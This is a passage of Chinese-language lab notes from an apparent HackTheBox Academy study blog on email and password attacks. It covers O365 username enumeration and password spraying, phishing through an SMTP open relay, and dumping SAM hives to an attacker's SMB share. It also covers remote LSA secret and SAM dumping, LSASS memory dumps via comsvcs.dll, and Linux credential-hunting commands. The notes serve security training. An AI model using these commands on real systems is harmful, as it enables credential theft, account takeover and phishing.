Enumeration</h2><p>如前所述，云服务提供商使用自己的电子邮件服务实现。这些服务通常具有自定义功能，我们可以滥用这些功能进行操作，例如用户名枚举。让我们以Office365为例，探讨如何在此云平台中枚举用户名。 <a href="https://github.com/0xZDH/o365spray">O365spray</a>是<a href="https://twitter.com/0xzdh">ZDH</a>开发的一款针对Microsoft Office 365（O365）的用户名枚举和密码喷涂工具。该工具重新实现了鸣谢中<a href="https://github.com/0xZDH/o365spray#Acknowledgments">Acknowledgments</a>提到的人员研究和确定的列举和喷涂技术的集合。让我们首先验证我们的目标域是否正在使用Office 365。</p><h4 id="O365-Spray"><a href="#O365-Spray" class="headerlink" title="O365 Spray"></a>O365 Spray</h4><pre><code class="shell-session">python3 o365spray.py --validate --domain msplaintext.xyz</code></pre><p>validate:验证</p><p>现在，我们可以尝试识别用户名。</p><pre><code class="shell-session"> python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz   </code></pre><h2 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a>Password Attacks</h2><p>我们可以使用Hydra对SMTP、POP3或IMAP4等电子邮件服务执行密码喷洒或暴力攻击。首先，我们需要获得用户名列表和密码列表，并指定要攻击的服务。让我们看看POP3的示例。</p><pre><code class="shell-session">hydra -L users.txt -p &#39;Company01!&#39; -f 10.10.110.20 pop3</code></pre><p>如果云服务支持SMTP、POP3或IMAP4协议，我们可能可以尝试使用Hydra等工具执行密码喷洒，但这些工具通常会被阻止。相反，我们可以尝试使用自定义工具，如适用于Microsoft Office 365的 <a href="https://github.com/0xZDH/o365spray">o365spray</a>或<a href="https://github.com/dafthack/MailSniper">MailSniper</a>，或适用于Gmail或Okta的 <a href="https://github.com/ustayready/CredKing">CredKing</a>。请记住，这些工具需要是最新的，因为如果服务提供商更改某些内容（这种情况经常发生），这些工具可能就无法再工作了。这是一个完美的例子，说明了为什么我们必须了解我们的工具在做什么，并拥有在它们因某种原因无法正常工作时对其进行修改的专业知识。</p><h4 id="O365-Spray-Password-Spraying"><a href="#O365-Spray-Password-Spraying" class="headerlink" title="O365 Spray - Password Spraying"></a>O365 Spray - Password Spraying</h4><pre><code class="shell-session"> python3 o365spray.py --spray -U usersfound.txt -p &#39;March2022!&#39; --count 1 --lockout 1 --domain msplaintext.xyz</code></pre><h2 id="Protocol-Specifics-Attacks"><a href="#Protocol-Specifics-Attacks" class="headerlink" title="Protocol Specifics Attacks"></a>Protocol Specifics Attacks</h2><p>开放中继是简单传输邮件协议（SMTP）服务器，该服务器配置不正确，允许未经身份验证的电子邮件中继。意外或有意配置为开放中继的消息服务器允许来自任何来源的邮件通过开放中继服务器透明地重新路由。这种行为屏蔽了消息的来源，使其看起来像是来自开放中继服务器的邮件。</p><h4 id="Open-Relay"><a href="#Open-Relay" class="headerlink" title="Open Relay"></a>Open Relay</h4><pre><code class="shell-session">Tanin@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213</code></pre><p>接下来，我们可以使用任何邮件客户端连接到邮件服务器并发送我们的电子邮件。</p><pre><code class="shell-session">Tanin@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header &#39;Subject: Company Notification&#39; --body &#39;Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/&#39; --server 10.10.11.213</code></pre><pre><code class="shell-session">=== Trying 10.10.11.213:25...=== Connected to 10.10.11.213.&lt;-  220 mail.localdomain SMTP Mailer ready -&gt; EHLO parrot&lt;-  250-mail.localdomain&lt;-  250-SIZE 33554432&lt;-  250-8BITMIME&lt;-  250-STARTTLS&lt;-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1&lt;-  250 HELP -&gt; MAIL FROM:&lt;notifications@inlanefreight.com&gt;&lt;-  250 OK -&gt; RCPT TO:&lt;employees@inlanefreight.com&gt;&lt;-  250 OK -&gt; DATA&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; -&gt; Date: Thu, 29 Oct 2020 01:36:06 -0400 -&gt; To: employees@inlanefreight.com -&gt; From: notifications@inlanefreight.com -&gt; Subject: Company Notification -&gt; Message-Id: &lt;20201029013606.775675@parrot&gt; -&gt; X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/ -&gt;  -&gt; Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/ -&gt;  -&gt;  -&gt; .&lt;-  250 OK -&gt; QUIT&lt;-  221 Bye=== Connection closed with remote host.</code></pre><h2 id="practice-4"><a href="#practice-4" class="headerlink" title="practice"></a>practice</h2><p>What is the available username for the domain inlanefreight.htb in the SMTP server?</p><p>What is the available username for the domain inlanefreight.htb in the SMTP server?</p><p>这里先用检测一下是否使用o365服务（后来仔细看发先这是检测云服务的，应该没有必要）：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201558544.png" alt="image-20230820155755455"></p><p>看来没有启用，使用常规方法：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201604202.png" alt="image-20230820160410150"></p><p>这里域名-D看样子是值邮件的后缀</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201614934.png" alt="image-20230820161403882"></p><p>用户名是带域名的，然后登录不知道怎么办，无论如何不给过</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308201653370.png" alt="image-20230820165359316"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Attacking-FTP&quot;&gt;&lt;a href=&quot;#Attacking-FTP&quot; class=&quot;headerlink&quot; title=&quot;Attacking FTP&quot;&gt;&lt;/a&gt;Attacking FTP&lt;/h1&gt;&lt;h4 id=&quot;Brute-Forcing&quot;&gt;&lt;a href=&quot;#Brute-Forcing&quot; class=&quot;headerlink&quot; title=&quot;Brute Forcing&quot;&gt;&lt;/a&gt;Brute Forcing&lt;/h4&gt;&lt;p&gt; &lt;a href=&quot;https://github.com/jmk-foofus/medusa&quot;&gt;Medusa&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用Medusa，我们可以使用选项-u指定要针对的单个用户，也可以使用选项-u提供一个包含用户名列表的文件。选项-P用于包含密码列表的文件。我们可以使用选项-M和目标协议（FTP），并使用选项-h作为目标主机名或IP地址。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Passwrod_Attack</title>
    <link href="https://taninluv.github.io/2023/07/20/Passwrod-Attack/"/>
    <id>https://taninluv.github.io/2023/07/20/Passwrod-Attack/</id>
    <published>2023-07-20T09:11:45.000Z</published>
    <updated>2023-08-01T04:16:10.131Z</updated>
    
    <content type="html"><![CDATA[<p>在我们的渗透测试中，我们遇到的每一个计算机网络都将安装用于管理、编辑或创建内容的服务。所有这些服务都使用特定的权限托管，并分配给特定的用户</p><span id="more"></span><h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>这里引入了一个新工具攻击各种基于windows的协议：</p><pre><code class="shell-session">Tanin@htb[/htb]$  crackmapexec -hoptional arguments:  -h, --help            show this help message and exit  -t THREADS            set how many concurrent threads to use (default: 100)  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)  --jitter INTERVAL     sets a random delay between each connection (default: None)  --darrell             give Darrell a hand  --verbose             enable verbose outputprotocols:  available protocols  &#123;mssql,smb,ssh,winrm&#125;    mssql               own stuff using MSSQL    smb                 own stuff using SMB    ssh                 own stuff using SSH    winrm               own stuff using WINRM</code></pre><p>针对某种协议的用法：</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb -h</code></pre><p>通用的语法大致如下：</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec &lt;proto&gt; &lt;target-IP&gt; -u &lt;user or userlist&gt; -p &lt;password or passwordlist&gt;</code></pre><h4 id="Evil-WinRM"><a href="#Evil-WinRM" class="headerlink" title="Evil-WinRM"></a>Evil-WinRM</h4><p>这里还提到了一个专门针对WinRM的工具 <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a></p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo gem install evil-winrm</code></pre><p>基本用法：</p><pre><code class="shell-session">Tanin@htb[/htb]$ evil-winrm -i &lt;target-IP&gt; -u &lt;username&gt; -p &lt;password&gt;</code></pre><p>直接上练习：</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>target:10.129.202.136</p><ul><li>查找WinRM服务的用户并破解其密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li><li>找到SSH服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li><li>找到RDP服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li><li>查找SMB服务的用户并破解他们的密码。然后，当您登录时，您会在那里的一个文件中找到该标志。提交您找到的标志作为答案。</li></ul></blockquote><p>这里纯属爆破比较无聊，而且vpn比较慢，直接学下一节吧。</p><h1 id="Password-Mutations"><a href="#Password-Mutations" class="headerlink" title="Password Mutations"></a>Password Mutations</h1><p>他给了一篇博客，是关于密码的<a href="https://wpengine.com/resources/passwords-unmasked-infographic/">WPengine</a></p><p>顺带再放一个hashcat的规则集方便查找：<a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">documentation</a></p><h4 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a><a href="https://github.com/digininja/CeWL">CeWL</a></h4><p>我们现在可以使用另一个名为CeWL的工具来扫描公司网站上的潜在单词，并将其保存在单独的列表中。然后，我们可以将该列表与所需规则相结合，创建一个自定义的密码列表，该列表猜测正确密码的概率更高。我们指定了一些参数，如spider的深度（-d）、单词的最小长度（-m）、找到的单词的小写存储（–lower），以及我们想要存储结果的文件（-w）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist</code></pre><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote><p>使用本节右上角“资源”下ZIP文件中的文件创建一个变异单词列表。使用此单词列表可以强制爆破用户“sam”的密码。成功后，使用SSH登录并提交flag.txt文件的内容作为您的答案。</p></blockquote><p>这里它给了一个文件里面有一个密码本和用户列表和一个规则集，上一题应该用这个文档能轻松爆破。。。</p><p>这里要做什么也很清楚，但是发现hydra不能直接使用-r了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201825210.png" alt="image-20230720182512124"></p><p>这里先用hashcat转换一下：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list</code></pre><blockquote><ol><li><code>hashcat</code>: 运行 Hashcat 密码破解工具。</li><li><code>--force</code>: 强制进行破解，即忽略一些警告信息。</li><li><code>password.list</code>: 这是包含要破解的密码列表的文件名，Hashcat 将从该文件中读取密码列表进行破解。</li><li><code>-r custom.rule</code>: 使用规则文件 <code>custom.rule</code> 对密码进行变换。规则文件定义了一系列的字符串转换规则，Hashcat 将应用这些规则来生成多个变换后的密码，并将其用于破解尝试。</li><li><code>--stdout</code>: 将生成的所有变换后的密码输出到标准输出（即屏幕），而不是进行实际的破解尝试。</li><li><code>|</code>: 管道符号，将前面命令的输出作为后面命令的输入。</li><li><code>sort -u</code>: 对密码进行排序并去除重复的密码。</li><li><code>&gt; mut_password.list</code>: 将排序后去重的密码列表输出到名为 <code>mut_password.list</code> 的文件中。</li></ol></blockquote><p>然后：</p><pre><code>hydra -l sam -P mut_password.list  ssh://10.129.202.64</code></pre><p>&#x3D;&#x3D;&gt;</p><h1 id="Password-Reuse-x2F-Default-Passwords"><a href="#Password-Reuse-x2F-Default-Passwords" class="headerlink" title="Password Reuse &#x2F; Default Passwords"></a>Password Reuse &#x2F; Default Passwords</h1><h2 id="Credential-Stuffing"><a href="#Credential-Stuffing" class="headerlink" title="Credential Stuffing"></a>Credential Stuffing</h2><p>他给出了一个默认凭据表： <a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">DefaultCreds-Cheat-Sheet</a></p><p>有时候由于接口服务等过多管理员选择复制粘贴默认密码而不是手动输入一个自定义密码</p><p>也可以直接搜索有无默认凭据：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201836635.png" alt="img"></p><h1 id="Windows-Local-Password-Attacks"><a href="#Windows-Local-Password-Attacks" class="headerlink" title="Windows Local Password Attacks"></a>Windows Local Password Attacks</h1><h2 id="Attacking-SAM"><a href="#Attacking-SAM" class="headerlink" title="Attacking SAM"></a>Attacking SAM</h2><h4 id="Copying-SAM-Registry-Hives"><a href="#Copying-SAM-Registry-Hives" class="headerlink" title="Copying SAM Registry Hives"></a>Copying SAM Registry Hives</h4><p>如果我们在目标上有本地管理员访问权限，我们可以复制三个注册表配置单元；当我们开始倾倒和破解散列时，每一个都有特定的目的。以下是下表中每一项的简要说明：</p><table><thead><tr><th>Registry Hive</th><th>Description</th></tr></thead><tbody><tr><td><code>hklm\sam</code></td><td>包含与本地帐户密码关联的哈希。我们需要散列，这样我们就可以破解它们，并以明文形式获得用户帐户密码。</td></tr><tr><td><code>hklm\system</code></td><td>包含用于加密SAM数据库的系统引导密钥。我们将需要引导密钥来解密SAM数据库。</td></tr><tr><td><code>hklm\security</code></td><td>包含域帐户的缓存凭据。我们可能会从加入域的Windows目标中受益。</td></tr></tbody></table><h4 id="Using-reg-exe-save-to-Copy-Registry-Hives"><a href="#Using-reg-exe-save-to-Copy-Registry-Hives" class="headerlink" title="Using reg.exe save to Copy Registry Hives"></a>Using reg.exe save to Copy Registry Hives</h4><p>以管理员身份启动CMD将允许我们运行reg.exe来保存上述注册表配置单元的副本。请运行以下命令执行此操作：</p><pre><code class="cmd-session">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.saveThe operation completed successfully.C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.saveThe operation completed successfully.C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.saveThe operation completed successfully.</code></pre><p>要创建共享，我们所要做的就是使用python运行smbserver.py-smb2support，给共享一个名称（CompData），并指定攻击主机上共享将存储配置单元副本的目录（&#x2F;home&#x2F;ltnob&#x2F;Documents）。要知道smb2support选项将确保支持较新版本的SMB。如果我们不使用此标志，从Windows目标连接到我们的攻击主机上托管的共享时将出现错误。较新版本的Windows默认不支持SMBv1，因为存在大量严重漏洞和公开漏洞。</p><p>一旦共享在我们的攻击主机上运行，我们就可以在Windows目标上使用move命令将配置单元副本移动到共享。</p><h4 id="Moving-Hive-Copies-to-Share"><a href="#Moving-Hive-Copies-to-Share" class="headerlink" title="Moving Hive Copies to Share"></a>Moving Hive Copies to Share</h4><pre><code class="cmd-session">C:\&gt; move sam.save \\10.10.15.16\CompData        1 file(s) moved.C:\&gt; move security.save \\10.10.15.16\CompData        1 file(s) moved.C:\&gt; move system.save \\10.10.15.16\CompData        1 file(s) moved.</code></pre><h2 id="Dumping-Hashes-with-Impacket’s-secretsdump-py"><a href="#Dumping-Hashes-with-Impacket’s-secretsdump-py" class="headerlink" title="Dumping Hashes with Impacket’s secretsdump.py"></a>Dumping Hashes with Impacket’s secretsdump.py</h2><p>使用secretsdump.py是一个简单的过程。我们所要做的就是使用Python运行secretsdump.py，然后指定从目标主机检索到的每个配置单元文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></pre><h2 id="Remote-Dumping-amp-LSA-Secrets-Considerations"><a href="#Remote-Dumping-amp-LSA-Secrets-Considerations" class="headerlink" title="Remote Dumping &amp; LSA Secrets Considerations"></a>Remote Dumping &amp; LSA Secrets Considerations</h2><p>通过使用本地管理员权限访问凭据，我们也可以通过网络锁定LSA机密。这可以允许我们从正在运行的服务、计划任务或使用LSA机密存储密码的应用程序中提取凭据。</p><h4 id="Dumping-LSA-Secrets-Remotely"><a href="#Dumping-LSA-Secrets-Remotely" class="headerlink" title="Dumping LSA Secrets Remotely"></a>Dumping LSA Secrets Remotely</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsaSMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)SMB         10.129.42.198   445    WS01     [+] Dumping LSA secretsSMB         10.129.42.198   445    WS01     WS01\worker:Hello123SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdcedpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944aSMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488bSMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached</code></pre><h4 id="Dumping-SAM-Remotely"><a href="#Dumping-SAM-Remotely" class="headerlink" title="Dumping SAM Remotely"></a>Dumping SAM Remotely</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</code></pre><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote><p>应用本节中教授的概念，获取目标上ITbackdoor用户帐户的密码。提交明文密码作为答案。</p><p>在目标上转储LSA机密并发现存储的凭据。提交用户名和密码作为答案。（格式：用户名：密码，区分大小写）</p></blockquote><h1 id="Attacking-LSASS"><a href="#Attacking-LSASS" class="headerlink" title="Attacking LSASS"></a>Attacking LSASS</h1><p>除了获得SAM数据库的副本以转储和破解哈希之外，我们还将受益于针对LSASS。如本模块的凭据存储部分所述，LSASS是一项关键服务，在所有Windows操作系统中的凭据管理和身份验证过程中发挥着核心作用。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201915415.png" alt="lsass Diagram"></p><p>初次登录后，LSASS将： 在内存中本地缓存凭据 创建访问令牌 强制执行安全策略 写入Windows安全日志 让我们介绍一些可以用来转储LSASS内存和从运行Windows的目标中提取凭据的技术和工具。</p><h2 id="Dumping-LSASS-Process-Memory"><a href="#Dumping-LSASS-Process-Memory" class="headerlink" title="Dumping LSASS Process Memory"></a>Dumping LSASS Process Memory</h2><p>与使用LSASS攻击SAM数据库的过程类似，我们最好首先通过生成内存转储来创建LSASS进程内存内容的副本。通过创建转储文件，我们可以使用攻击主机离线提取凭据。请记住，离线进行攻击使我们在攻击速度上具有更大的灵活性，并且在目标系统上花费的时间更少。我们可以使用无数种方法来创建内存转储。让我们介绍一下可以使用Windows内置工具执行的技术。</p><h4 id="Task-Manager-Method"><a href="#Task-Manager-Method" class="headerlink" title="Task Manager Method"></a>Task Manager Method</h4><p>通过访问与目标的交互式图形会话，我们可以使用任务管理器创建内存转储。这就要求我们：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307201916966.png" alt="Task Manager Memory Dump"></p><p>打开任务管理器&gt;选择进程选项卡&gt;查找并右键单击本地安全机构进程&gt;选择创建转储文件</p><p>一个名为lsass.DMP的文件被创建并保存在：</p><pre><code class="cmd-session">C:\Users\loggedonusersdirectory\AppData\Local\Temp</code></pre><h4 id="Rundll32-exe-amp-Comsvcs-dll-Method"><a href="#Rundll32-exe-amp-Comsvcs-dll-Method" class="headerlink" title="Rundll32.exe &amp; Comsvcs.dll Method"></a>Rundll32.exe &amp; Comsvcs.dll Method</h4><p>任务管理器方法依赖于我们与目标进行基于GUI的交互式会话。我们可以使用另一种方法，通过名为 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32">rundll32.exe</a>的命令行实用程序转储LSASS进程内存。这种方法比任务管理器方法更快，也更灵活，因为我们可能只需访问命令行就可以在Windows主机上获得shell会话。需要注意的是，现代反病毒工具将这种方法识别为恶意活动。 在发出创建转储文件的命令之前，我们必须确定为lsass.exe分配了哪个进程ID（PID）。这可以通过cmd或PowerShell完成：</p><h4 id="Finding-LSASS-PID-in-cmd"><a href="#Finding-LSASS-PID-in-cmd" class="headerlink" title="Finding LSASS PID in cmd"></a>Finding LSASS PID in cmd</h4><pre><code class="cmd-session">C:\Windows\system32&gt; tasklist /svcImage Name                     PID Services========================= ======== ============================================System Idle Process              0 N/ASystem                           4 N/ARegistry                        96 N/Asmss.exe                       344 N/Acsrss.exe                      432 N/Awininit.exe                    508 N/Acsrss.exe                      520 N/Awinlogon.exe                   580 N/Aservices.exe                   652 N/Alsass.exe                      672 KeyIso, SamSs, VaultSvc</code></pre><pre><code class="powershell-session">PS C:\Windows\system32&gt; Get-Process lsassHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName-------  ------    -----      -----     ------     --  -- -----------   1260      21     4948      15396       2.56    672   0 lsass</code></pre><h4 id="Creating-lsass-dmp-using-PowerShell"><a href="#Creating-lsass-dmp-using-PowerShell" class="headerlink" title="Creating lsass.dmp using PowerShell"></a>Creating lsass.dmp using PowerShell</h4><pre><code class="powershell-session">PS C:\Windows\system32&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</code></pre><h2 id="Using-Pypykatz-to-Extract-Credentials"><a href="#Using-Pypykatz-to-Extract-Credentials" class="headerlink" title="Using Pypykatz to Extract Credentials"></a>Using Pypykatz to Extract Credentials</h2><p> <a href="https://github.com/skelsec/pypykatz">pypykatz</a></p><p>该命令启动使用pypykatz来解析LSASS进程内存转储中隐藏的机密。我们在命令中使用lsa，因为LSASS是本地安全机构的子系统，然后我们将数据源指定为小型转储文件，按照存储在攻击主机上的转储文件的路径（&#x2F;home&#x2F;peter&#x2F;Documents&#x2F;lass.dmp）进行。Pypykatz解析转储文件并输出结果：</p><pre><code class="shell-session">Tanin@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp </code></pre><p>一些有用的凭据：</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">MSV</a>是Windows中的一个身份验证包，LSA调用它来验证SAM数据库的登录尝试。Pypykatz提取了存储在LSASS进程内存中的与bob用户帐户的登录会话相关的SID、用户名、域，甚至NT&amp;SHA1密码哈希。这将在本节末尾介绍的我们进攻的最后阶段证明是有帮助的。</p><p>WDIGEST是一种较旧的身份验证协议，默认情况下在Windows XP-Windows 8和Windows Server 2003-Windows Server 2012中启用。LSASS以明文形式缓存WDIGEST使用的凭据。这意味着，如果我们发现自己的目标是启用WDIGEST的Windows系统，我们很可能会看到明文形式的密码。现代Windows操作系统默认情况下已禁用WDIGEST。此外，需要注意的是，Microsoft发布了针对受此问题影响的系统的WDIGEST安全更新。我们可以在这里 <a href="https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/">here</a>.研究安全更新的细节。</p><p><a href="https://web.mit.edu/kerberos/#what_is">Kerberos</a>是Active Directory在Windows域环境中使用的网络身份验证协议。域用户帐户在使用Active Directory进行身份验证时被授予票证。此票证用于允许用户访问网络上已被授予访问权限的共享资源，而无需每次键入凭据。LSASS缓存与Kerberos关联的密码、ekeys、票证和pin。可以从LSASS进程内存中提取这些，并使用它们访问加入同一域的其他系统。</p><p>&#x3D;&#x3D;数据保护应用程序编程接口（<a href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">DPAPI</a> ）是Windows操作系统中的一组API，用于在每个用户的基础上为Windows操作系统功能和各种第三方应用程序加密和解密DPAPI数据块。&#x3D;&#x3D;</p><h1 id="Credential-Hunting-in-Linux"><a href="#Credential-Hunting-in-Linux" class="headerlink" title="Credential Hunting in Linux"></a>Credential Hunting in Linux</h1><h2 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h2><p>我们应该逐一查找、查找和检查几类文件。这些类别如下：</p><table><thead><tr><th>Configuration files</th><th>Databases</th><th>Notes</th></tr></thead><tbody><tr><td>Scripts</td><td>Cronjobs</td><td>SSH keys</td></tr></tbody></table><p>通常，配置文件标记有以下三个文件扩展名（.config、.conf、.cnf）。通过下面的方法，我们将看到我们的搜索减少到了这三个文件扩展名。</p><pre><code class="shell-session">cry0l1t3@unixclient:~$ for l in $(echo &quot;.conf .config .cnf&quot;);do echo -e &quot;\nFile extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;lib\|fonts\|share\|core&quot; ;done</code></pre><h4 id="Databases"><a href="#Databases" class="headerlink" title="Databases"></a>Databases</h4><pre><code class="shell-session">for l in $(echo &quot;.sql .db .*db .db*&quot;);do echo -e &quot;\nDB File extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;doc\|lib\|headers\|share\|man&quot;;done</code></pre><h4 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h4><pre><code class="shell-session">cry0l1t3@unixclient:~$ for l in $(echo &quot;.py .pyc .pl .go .jar .c .sh&quot;);do echo -e &quot;\nFile extension: &quot; $l; find / -name *$l 2&gt;/dev/null | grep -v &quot;doc\|lib\|headers\|share&quot;;done</code></pre><h4 id="SSH-Keys"><a href="#SSH-Keys" class="headerlink" title="SSH Keys"></a>SSH Keys</h4><p>SSH密钥可以被视为用于公钥身份验证机制的SSH协议的“访问卡”。为客户端生成一个文件（私钥），为服务器生成一个相应的文件（公钥）。然而，这些并不相同，因此知道公钥不足以找到私钥。公钥可以验证由专用SSH密钥生成的签名，从而能够自动登录到服务器。即使未经授权的人获得了公钥，也几乎不可能从中计算出匹配的私钥。当使用私钥SSH连接到服务器时，服务器会检查私钥是否有效，并让客户端相应登录。因此，通过SSH连接不再需要密码。 由于SSH密钥可以任意命名，因此我们无法在它们中搜索特定的名称。然而，它们的格式允许我们唯一地识别它们，因为无论是公钥还是私钥，都有唯一的第一行来区分它们。</p><pre><code class="shell-session">grep -rnw &quot;PRIVATE KEY&quot; /home/* 2&gt;/dev/null | grep &quot;:1&quot;</code></pre><blockquote><ul><li><code>-r</code>: 递归地搜索目录及其子目录下的文件。</li><li><code>-n</code>: 显示匹配行及其行号。</li><li><code>-w</code>: 仅匹配完整单词，而不是部分匹配。</li><li><code>&quot;PRIVATE KEY&quot;</code>: 要搜索的文本模式，即我们要找到包含的字符串。</li></ul></blockquote><h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><p>所有历史文件都提供了有关当前和过去&#x2F;历史过程的重要信息。我们对存储用户命令历史记录的文件和存储系统进程信息的日志感兴趣。 在使用Bash作为标准shell的Linux发行版上输入的命令的历史记录中，我们可以在.Bash_history中找到相关文件。然而，其他文件（如.bashrc或.Bash_profile）可能包含重要信息。 </p><h4 id="Bash-History"><a href="#Bash-History" class="headerlink" title="Bash History"></a>Bash History</h4><pre><code class="shell-session">tail -n5 /home/*/.bash*</code></pre><table><thead><tr><th><strong>Log File</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>/var/log/messages</code></td><td>Generic system activity logs.</td></tr><tr><td><code>/var/log/syslog</code></td><td>Generic system activity logs.</td></tr><tr><td><code>/var/log/auth.log</code></td><td>(Debian) All authentication related logs.</td></tr><tr><td><code>/var/log/secure</code></td><td>(RedHat&#x2F;CentOS) All authentication related logs.</td></tr><tr><td><code>/var/log/boot.log</code></td><td>Booting information.</td></tr><tr><td><code>/var/log/dmesg</code></td><td>Hardware and drivers related information and logs.</td></tr><tr><td><code>/var/log/kern.log</code></td><td>Kernel related warnings, errors and logs.</td></tr><tr><td><code>/var/log/faillog</code></td><td>Failed login attempts.</td></tr><tr><td><code>/var/log/cron</code></td><td>Information related to cron jobs.</td></tr><tr><td><code>/var/log/mail.log</code></td><td>All mail server related logs.</td></tr><tr><td><code>/var/log/httpd</code></td><td>All Apache related logs.</td></tr><tr><td><code>/var/log/mysqld.log</code></td><td>All MySQL server related logs.</td></tr></tbody></table><h2 id="Memory-and-Cache"><a href="#Memory-and-Cache" class="headerlink" title="Memory and Cache"></a>Memory and Cache</h2><p>有一个名为 <a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a>的工具可以使整个过程变得更容易。但是，此工具需要管理员&#x2F;root权限</p><p>我们可以使用的一个更强大的工具是LaZagne</p><h1 id="Passwd-Shadow-amp-Opasswd"><a href="#Passwd-Shadow-amp-Opasswd" class="headerlink" title="Passwd, Shadow &amp; Opasswd"></a>Passwd, Shadow &amp; Opasswd</h1><h4 id="Passwd-Format"><a href="#Passwd-Format" class="headerlink" title="Passwd Format"></a>Passwd Format</h4><table><thead><tr><th><code>cry0l1t3</code></th><th><code>:</code></th><th><code>x</code></th><th><code>:</code></th><th><code>1000</code></th><th><code>:</code></th><th><code>1000</code></th><th><code>:</code></th><th><code>cry0l1t3,,,</code></th><th><code>:</code></th><th><code>/home/cry0l1t3</code></th><th><code>:</code></th><th><code>/bin/bash</code></th></tr></thead><tbody><tr><td>Login name</td><td></td><td>Password info</td><td></td><td>UID</td><td></td><td>GUID</td><td></td><td>Full name&#x2F;comments</td><td></td><td>Home directory</td><td></td><td></td></tr></tbody></table><h4 id="Shadow-Format"><a href="#Shadow-Format" class="headerlink" title="Shadow Format"></a>Shadow 